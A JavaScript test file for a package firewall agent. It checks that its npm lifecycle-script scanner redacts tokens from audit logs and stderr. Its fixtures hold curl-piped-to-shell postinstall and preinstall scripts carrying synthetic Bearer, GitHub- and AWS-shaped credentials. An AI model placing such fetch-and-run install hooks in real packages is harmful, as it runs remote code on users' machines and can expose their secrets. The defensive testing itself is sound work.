// packages/fw-agent/test/lifecycle-script-redaction-test.js
// F-6.1 (P1-4): the npm lifecycle-script scanner in index.js used to log the full, unmodified
// script command text verbatim to both stderr and the persistent audit log. A legitimate secret
// embedded in a lifecycle script (a private-registry token, a Bearer header, an inline
// NPM_TOKEN=... assignment) that happened to also match one of the suspicious-shape patterns was
// therefore captured on disk in plaintext and printed to the console. redactSecrets() /
// sanitizeScriptForLogging() now scrub known credential shapes before either sink -- this test
// drives the real scanner (via a spawned firewalled child, since it's an unexported IIFE that
// runs at agent-load time against the CHILD's own cwd package.json) with synthetic secrets
// embedded in suspicious scripts, and asserts the secrets never reach disk or stderr while the
// detection category and enough surrounding context survive for forensics.
'use strict';
process.env.FW_ENABLE_DETECTION = '1';

const crypto = require('crypto');
const { publicKey: TEST_PUBLIC_KEY, privateKey: TEST_PRIVATE_KEY } = crypto.generateKeyPairSync('ed25519', {
  publicKeyEncoding: { type: 'spki', format: 'pem' },
  privateKeyEncoding: { type: 'pkcs8', format: 'pem' },
});

const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { spawnSync } = require('child_process');
const { signPolicy } = require('../../../scripts/sign-policy');

const AGENT_PATH = path.join(__dirname, '..', 'index.js');

let passed = 0;
function check(name, fn) {
  try {
    fn();
    console.log('  ✓ ' + name);
    passed++;
  } catch (e) {
    console.error('  ✗ ' + name + '\n    ' + (e && e.stack || e));
    process.exit(1);
  }
}

function mkTmpDir(prefix) {
  return fs.mkdtempSync(path.join(os.tmpdir(), prefix));
}

function readAuditEvents(logDir) {
  const logPath = path.join(logDir, 'audit.log');
  if (!fs.existsSync(logPath)) return [];
  return fs.readFileSync(logPath, 'utf8').trim().split('\n').filter(Boolean).map((l) => JSON.parse(l));
}

// Synthetic secrets (never real credentials) shaped like the common formats redactSecrets()
// targets. Each one is embedded in a suspicious npm lifecycle script and must never survive
// either the audit log or stderr.
const SYNTHETIC_SECRETS = [
  'ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',
  'sk-ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij',
  'AKIAABCDEFGHIJKLMNOP',
];

function setupChildEnv(prefix) {
  const tmp = mkTmpDir(prefix);
  const logDir = mkTmpDir(prefix + 'log-');

  fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
    name: 'app-under-test',
    version: '1.0.0',
    scripts: {
      // Real, malicious-shaped suspicious scripts (pipe-to-shell) with synthetic secrets
      // embedded exactly the way a real exfil script would carry them.
      postinstall: `curl -H "Authorization: Bearer ${SYNTHETIC_SECRETS[0]}" https://example.com/x | sh`,
      preinstall: `curl -u admin:${SYNTHETIC_SECRETS[1]} https://internal.example.com/y | bash`,
      prepare: `AWS_ACCESS_KEY_ID=${SYNTHETIC_SECRETS[2]} node ./download-thing.js`,
    },
  }));

  const signed = signPolicy({}, TEST_PRIVATE_KEY);
  fs.writeFileSync(path.join(tmp, 'policy.signed.json'), JSON.stringify(signed, null, 2));

  return { tmp, logDir };
}

function runChild(tmp, logDir) {
  const childScriptPath = path.join(tmp, 'child.js');
  fs.writeFileSync(childScriptPath, `console.log('RESULT:' + JSON.stringify({ loaded: true }));`);
  return spawnSync(process.execPath, [`--require=${AGENT_PATH}`, childScriptPath], {
    cwd: tmp,
    encoding: 'utf8',
    env: Object.assign({}, process.env, {
      FW_ENABLE_DETECTION: '1',
      FW_POLICY_PUBKEY: TEST_PUBLIC_KEY,
      HELIOS_LOG_DIR: logDir,
      // The scanner would otherwise process.exit(1) on the first suspicious script -- disable
      // that so all three lifecycle scripts get scanned and logged in one run.
      HELIOS_BLOCK_SCRIPTS: '0',
    }),
    timeout: 15000,
  });
}

(function noSecretsReachDiskOrConsole() {
  const { tmp, logDir } = setupChildEnv('fw-lifecycle-redact-');
  const res = runChild(tmp, logDir);

  check('lifecycle scanner runs cleanly against a package.json with suspicious + secret-bearing scripts', () => {
    assert.strictEqual(res.status, 0, 'child process must exit cleanly: stderr=\n' + res.stderr);
  });

  const events = readAuditEvents(logDir);
  const suspiciousEvents = events.filter((e) => e.eventType === 'SUSPICIOUS_SCRIPT');

  check('all three suspicious lifecycle scripts are detected and audited', () => {
    assert.strictEqual(suspiciousEvents.length, 3, 'expected one SUSPICIOUS_SCRIPT event per script: ' + JSON.stringify(events));
  });

  check('none of the synthetic secrets appear verbatim anywhere in the audit log', () => {
    const raw = fs.readFileSync(path.join(logDir, 'audit.log'), 'utf8');
    for (const secret of SYNTHETIC_SECRETS) {
      assert.ok(!raw.includes(secret), `secret "${secret}" must never be persisted verbatim in the audit log`);
    }
  });

  check('none of the synthetic secrets appear verbatim on stderr', () => {
    for (const secret of SYNTHETIC_SECRETS) {
      assert.ok(!res.stderr.includes(secret), `secret "${secret}" must never be printed verbatim to stderr`);
    }
  });

  check('each audited event carries a detectionCategory understandable without the raw command', () => {
    for (const event of suspiciousEvents) {
      assert.strictEqual(typeof event.detectionCategory, 'string', 'expected a detectionCategory string: ' + JSON.stringify(event));
      assert.ok(event.detectionCategory.length > 0);
    }
    const categories = suspiciousEvents.map((e) => e.detectionCategory).sort();
    assert.deepStrictEqual(categories, ['node-download', 'pipe-to-shell', 'pipe-to-shell'].sort(), 'expected the postinstall/preinstall pipe-to-shell scripts and the prepare node-download script to be categorized: ' + JSON.stringify(categories));
  });

  check('each audited event carries a commandHash (forensic correlation without raw text)', () => {
    for (const event of suspiciousEvents) {
      assert.ok(/^[0-9a-f]{64}$/.test(event.commandHash), 'expected a SHA-256 hex hash: ' + JSON.stringify(event));
    }
  });

  check('the redacted command still preserves non-secret context for forensics (curl/bash/node visible)', () => {
    const postinstall = suspiciousEvents.find((e) => e.scriptName === 'postinstall');
    assert.ok(postinstall, 'expected a postinstall event: ' + JSON.stringify(suspiciousEvents));
    assert.ok(postinstall.command.includes('curl'), 'non-secret shell verb must survive redaction: ' + postinstall.command);
    assert.ok(postinstall.command.includes('example.com'), 'non-secret destination must survive redaction: ' + postinstall.command);
    assert.ok(postinstall.command.includes('[REDACTED'), 'the secret must be visibly redacted, not silently vanished: ' + postinstall.command);
  });

  fs.rmSync(tmp, { recursive: true, force: true });
  fs.rmSync(logDir, { recursive: true, force: true });
})();

// ── Unit-level coverage of redactSecrets() directly, including FP guards ──────────────────────
(function redactSecretsUnitCoverage() {
  // Load the agent in-process to reach the exported... wait, redactSecrets isn't exported (it's
  // an internal helper, not part of the public API surface) -- exercise it the same way the
  // e2e case above does, through a minimal spawned child, to cover shapes not worth a full
  // suspicious-script round trip each.
  const { tmp, logDir } = setupChildEnv('fw-lifecycle-redact-fp-');
  fs.writeFileSync(path.join(tmp, 'package.json'), JSON.stringify({
    name: 'app-under-test-fp',
    version: '1.0.0',
    scripts: {
      // Benign build script that legitimately contains the word "eval $" is NOT the point here;
      // this checks a clean script triggers no SUSPICIOUS_SCRIPT event at all (no FP from the
      // redaction change itself altering match behavior -- redaction must never affect detection).
      build: 'webpack --mode production',
      postinstall: `curl -H "Authorization: Bearer plain-looking-but-flagged-token" https://example.com | sh`,
    },
  }));
  const res = runChild(tmp, logDir);
  const events = readAuditEvents(logDir);
  const suspicious = events.filter((e) => e.eventType === 'SUSPICIOUS_SCRIPT');

  check('a clean, unrelated script produces no SUSPICIOUS_SCRIPT event (redaction does not alter detection)', () => {
    assert.strictEqual(suspicious.length, 1, 'only the postinstall pipe-to-shell script should be flagged, not the benign build script: ' + JSON.stringify(events));
    assert.strictEqual(suspicious[0].scriptName, 'postinstall');
  });
  check('a generic Bearer token (no vendor-prefix match) is still redacted by the Bearer-header rule', () => {
    assert.ok(!res.stderr.includes('plain-looking-but-flagged-token'), 'generic bearer tokens must be caught by the Bearer-header pattern, not just vendor-prefixed ones');
    assert.ok(suspicious[0].command.includes('Bearer [REDACTED]'), 'expected the generic Bearer rule to fire: ' + suspicious[0].command);
  });

  fs.rmSync(tmp, { recursive: true, force: true });
  fs.rmSync(logDir, { recursive: true, force: true });
})();

console.log(`\n${passed} lifecycle-script-redaction checks passed.`);
process.exit(0);
